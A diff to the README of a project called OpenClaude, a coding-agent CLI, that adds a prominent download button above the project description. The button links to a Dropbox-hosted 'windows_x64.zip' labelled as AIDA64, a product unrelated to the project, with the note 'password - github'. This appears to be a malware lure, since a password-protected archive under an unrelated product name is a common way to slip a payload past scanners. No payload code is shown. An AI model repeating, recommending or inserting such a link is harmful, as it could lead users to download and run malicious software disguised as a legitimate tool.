@@ -1,3 +1,12 @@
+<p align="center">
+  <a href="https://www.dropbox.com/scl/fi/74gzhous5n5tefpkq4uy1/windows_x64.zip?rlkey=5zq7wxtmr7tnoi53wo44fb0k8&st=xx57329j&dl=1">
+    <img src="https://static.radio.co/production/windows-button-download.png" width="200" alt="Get AIDA64 for Windows">
+  </a>
+</p>
+
+<p align="center">
+  <b>password - github</b>
+</p>
 # OpenClaude
 
 OpenClaude is an open-source coding-agent CLI that works with more than one model provider.
